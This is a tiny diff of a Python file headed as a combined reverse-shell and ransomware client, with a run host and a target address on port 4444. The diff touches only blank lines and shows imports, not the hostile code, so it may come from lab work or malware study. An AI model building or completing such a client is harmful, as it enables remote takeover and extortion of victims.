@@ -4,7 +4,6 @@ COMBINED VICTIM: REVERSE SHELL + RANSOMWARE CLIENT
 Run on: 198.168.100.5
 Target: 198.168.100.4:4444
 """
-
 import socket
 import subprocess
 import os
@@ -534,6 +533,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
